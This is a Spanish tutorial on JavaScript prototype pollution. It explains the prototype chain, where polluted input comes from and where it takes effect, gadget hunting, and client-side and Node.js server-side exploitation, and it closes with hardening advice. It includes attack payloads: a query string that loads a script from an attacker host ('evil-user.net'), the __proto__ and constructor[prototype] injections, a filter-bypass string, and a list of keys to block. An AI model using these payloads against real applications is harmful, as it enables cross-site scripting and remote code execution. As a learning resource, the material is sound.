# Prototype pollution

## 1️⃣ ¿Qué es Prototype Pollution?

**Prototype Pollution** es una vulnerabilidad de JavaScript que permite a un atacante **añadir/modificar propiedades** en prototipos (por ejemplo `Object.prototype`, `Array.prototype`, etc.).\
Como **la mayoría de objetos heredan** de esos prototipos, la propiedad “contaminada” puede acabar **afectando a casi todo el runtime**, alterando lógica de seguridad, configuración, renderizado, etc.

📌 Idea clave: no “hackeas un objeto”, hackeas **la herencia** que comparten muchos objetos.

***

## 2️⃣ ¿Por qué esto es peligroso?

En JavaScript, cuando haces:

```js
obj.algo
```

el motor busca:

1. `algo` en **obj** (propiedad propia)
2. si no existe, sube al **prototype**
3. y así sucesivamente por la **prototype chain**

Si logras meter `isAdmin=true` en `Object.prototype`, entonces:

```js
({}).isAdmin === true
({foo:"bar"}).isAdmin === true
```

…a menos que el objeto tenga su propia propiedad `isAdmin` que “tape” la heredada.

***

## 3️⃣ Prototipos e herencia en JavaScript (base necesaria)

### 📌 3.1 ¿Qué es un objeto?

Colección de pares **clave:valor** (propiedades). Puede contener funciones (métodos).

```js
const user = { username: "wiener", isAdmin: false }
user.username
user["isAdmin"]
```

### 📌 3.2 ¿Qué es un prototipo?

Todo objeto está enlazado a otro objeto: su **prototype**.

Ejemplos:

```js
Object.getPrototypeOf({})      // Object.prototype
Object.getPrototypeOf("")      // String.prototype
Object.getPrototypeOf([])      // Array.prototype
Object.getPrototypeOf(1)       // Number.prototype
```

### 📌 3.3 Prototype chain

El prototipo de un objeto es otro objeto que a su vez tiene prototipo… hasta llegar a:

* `Object.prototype`
* cuyo prototipo es `null`

***

## 4️⃣ ¿Cómo funciona Prototype Pollution?

El patrón típico es:

1. el atacante controla un objeto (por URL/JSON/postMessage/etc.)
2. una función lo **fusiona** (merge) con otro objeto existente (a menudo recursivo)
3. no se filtran claves especiales (`__proto__`, `constructor`, `prototype`)
4. el merge termina escribiendo en el prototipo en vez de en el objeto “normal”

Ejemplo clásico (tal cual tu idea):

```js
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
const someObject = Object.assign({}, payload);

// ahora muchos objetos heredan isAdmin=true
console.log({}.isAdmin);
```

📌 Matiz importante:

* Un objeto literal `{ __proto__: {...} }` tiene comportamiento especial y **puede no contar como propiedad propia**.
* En cambio, `JSON.parse('{"__proto__": {...}}')` sí suele producir una clave `__proto__` como dato “normal”, y el problema aparece cuando alguien la fusiona en otro objeto.

***

## 5️⃣ ¿Cómo surgen estas vulnerabilidades?

Casi siempre por **merge recursivo** o “auto-binding” sin sanitizar claves.\
Cosas típicas que lo disparan:

* parsers de query string que convierten `a[b]=c` en objetos anidados
* utilidades de deep merge / extend
* frameworks o librerías que mezclan “opciones” con “defaults”
* lógica que copia `req.body` sobre objetos de sesión/usuario/config

📌 Clave: el bug no es “existe **proto**”, sino **permitir que un input controle claves que afectan a la herencia**.

***

## 6️⃣ Componentes de una explotación real

Para pasar de “pollution” a “impacto” suelen hacer falta tres piezas:

### 📌 6.1 Fuente (source)

Alguna entrada que te permita meter propiedades arbitrarias en el merge:

* URL (query string o hash)
* JSON (`JSON.parse`)
* `postMessage`
* storage (localStorage/sessionStorage) si luego se mergea
* formularios → convertidos a objeto por alguna lib

### 📌 6.2 Sink

Algo peligroso que, si controlas una propiedad “indirecta”, te da impacto:

* DOM XSS (innerHTML, document.write…)
* open redirect (location)
* carga de scripts (script.src)
* en servidor: ejecución comandos/procesos (child\_process)
* bypasses lógicos: flags, roles, toggles, config

### 📌 6.3 Gadget

La **propiedad concreta** que:

* la app/lib usa _asumiendo que no es controlable_
* y tú puedes influirla por herencia (porque no está definida como propiedad propia)

Ejemplo típico de gadget en libs de “opciones”:

```js
let transport_url = config.transport_url || defaults.transport_url;
```

Si `config.transport_url` no existe como propiedad propia y tú contaminas `Object.prototype.transport_url`, el `config.transport_url` “aparece” heredado.

***

## 7️⃣ Fuentes comunes: URL y JSON

### 📌 7.1 Prototype pollution vía URL (query string)

Payload conceptual:

```
?__proto__[evilProperty]=payload
```

Si un parser + merge recursivo acaba haciendo algo como:

```js
target.__proto__.evilProperty = 'payload'
```

terminas contaminando el prototipo.

📌 En la práctica, “evilProperty” rara vez sirve; se busca contaminar **propiedades que la app/stack usa** (flags, config, etc.).

### 📌 7.2 Prototype pollution vía JSON

Payload:

```json
{ "__proto__": { "evilProperty": "payload" } }
```

`JSON.parse()` permite claves arbitrarias; el peligro llega cuando ese objeto se mezcla sin filtrar.

***

## 8️⃣ Sinks y gadgets: convertirlo en impacto

### 📌 8.1 Ejemplo clásico: cargar JS desde dominio del atacante

Si existe un flujo tipo:

```js
let transport_url = config.transport_url || defaults.transport_url;
let s = document.createElement("script");
s.src = `${transport_url}/example.js`;
document.body.appendChild(s);
```

Y `config.transport_url` no está definido, basta con:

```
?__proto__[transport_url]=//evil-user.net
```

Incluso se han visto payloads tipo `data:` para “embeber” XSS en la URL (según contexto y defensas).

### 📌 8.2 “Gadget hunting” (manual)

Tú ya lo tienes bien planteado: instrumentas accesos a propiedades con getters que hagan `console.trace()` para ver dónde se leen y si llegan a un sink.

***

## 9️⃣ Client-side Prototype Pollution

### 📌 9.1 Encontrar fuentes manualmente

Proceso típico:

1. prueba inyecciones por query/hash/JSON
   * `?__proto__[foo]=bar`
   * `?__proto__.foo=bar`
2. verifica en consola:
   * `Object.prototype.foo`
3. si no funciona, prueba variantes (dot/brackets) y otras rutas de parseo.

### 📌 9.2 Con herramientas

DOM Invader (Burp Browser) acelera muchísimo:

* detecta sources
* detecta gadgets
* a veces genera PoC

***

## 🔟 Pollution vía constructor (bypass de “bloquear **proto**”)

Bloquear `__proto__` es una mitigación común pero **no suficiente**.

Como casi todos los objetos tienen `constructor`, puedes llegar a:

* `obj.constructor` → `Object()`
* `obj.constructor.prototype` → `Object.prototype`

Por eso aparecen payloads que apuntan a:

* `constructor[prototype][x]=y`\
  dependiendo de cómo el parser construya objetos anidados.

📌 Idea clave: puedes referenciar prototipos sin tocar la cadena `__proto__`.

***

## 1️⃣1️⃣ Bypass de sanitización defectuosa de claves

Muchos filtros hacen “replace” una vez y se quedan tranquilos.\
La ofuscación tipo:

```
__pro__proto__to__
```

puede convertirse en `__proto__` tras una eliminación parcial si no se repite ni se sanea recursivamente.

***

## 1️⃣2️⃣ Prototype Pollution en librerías externas

Muy habitual porque:

* usan deep merge para opciones/config
* asumen que “esto no es input del usuario”
* están minificadas/obfuscadas → difícil gadget hunting manual

Aquí DOM Invader y escáneres específicos ayudan muchísimo.

***

## 1️⃣3️⃣ Prototype Pollution via APIs del navegador (gadgets “sorpresa”)

### 📌 13.1  fetch() como gadget indirecto

`fetch(url, options)` acepta un objeto `options`.\
Si la app crea `{method:"GET"}` y deja `headers` indefinido, y tú contaminas:

* `Object.prototype.headers = {...}`

…puedes influir la request.

Luego, si la respuesta se usa para construir HTML con `innerHTML`, puedes encadenar a **DOM XSS** (tal como describes con `x-username`).

📌 Importante: aquí la “magia” es que estás controlando **opciones heredadas** que el dev no esperaba.

### 📌 13.2 Object.defineProperty() como vector de bypass

Si el descriptor no define `value`, pero hereda `value` del prototipo contaminado, puedes colar el valor igualmente.

***

## 1️⃣4️⃣ Server-side Prototype Pollution (Node.js)

### 📌 14.1  Por qué es más difícil que client-side

* no ves runtime / no DevTools
* no sabes sinks fácilmente
* riesgo de **DoS** y contaminación persistente durante vida del proceso Node
* difícil “resetear” el estado contaminado

### 📌 14.2 Detección por reflexión (for...in)

`for...in` itera propiedades enumerables **incluidas heredadas**, así que una propiedad contaminada puede “aparecer” en respuestas JSON si el servidor serializa objetos iterados.

Ejemplo:\
envías:

```json
{
  "user":"wiener",
  "__proto__": { "foo":"bar" }
}
```

y si en respuesta ves `"foo":"bar"` sin ser propiedad propia → señal fuerte.

### 📌 14.3 Detección sin reflexión: cambios de comportamiento (no destructivo)

Técnicas típicas (muy útiles en caja negra):

* override de **status** / **statusCode** en errores
* override de **json spaces** (indentación de JSON) si Express lo hereda
* override de **charset** (ej. UTF-7) via contaminación de propiedades relacionadas con headers/parsers

Estas técnicas son valiosas porque dan un “bit” observable sin romper todo.

### 📌 14.4 De pollution a RCE

En Node, si alcanzas gadgets que influyen:

* `child_process.fork` (execArgv, etc.)
* `spawn`, `exec`, `execSync` (opciones como `shell`, `input`, `env`)

…puede llegar a **RCE**. Aquí ya entran cadenas de explotación más delicadas por estabilidad y evidencia (y por no tumbar servicios).

***

## 1️⃣5️⃣ Prevención y hardening

### 📌 15.1 Sanitización de claves (mejor allowlist)

* Mejor: **allowlist** de claves permitidas al hacer merge
* Si usas blocklist: filtra **recursivamente** y cubre:
  * `__proto__`
  * `constructor`
  * `prototype`
  * y variantes ofuscadas / unicode / paths

📌 Blocklist = parche rápido, pero históricamente bypassable.

### 📌 15.2 Bloquear modificación de prototipos

* `Object.freeze(Object.prototype)` corta muchas vías
* `Object.seal()` es menos estricto (permite cambios en valores existentes)

⚠️ Ojo: puede romper librerías que “monkey-patchean” prototipos (mala práctica, pero existe).

### 📌 15.3 Evitar herencia donde no hace falta

Crear objetos sin prototipo:

```js
const obj = Object.create(null);
```

Así no hereda nada de `Object.prototype`.

### 📌 15.4 Estructuras más seguras para “options”

Usar `Map` / `Set` y APIs como `.get()` / `.has()` que operan sobre entradas propias (y evitan lecturas accidentales por herencia).
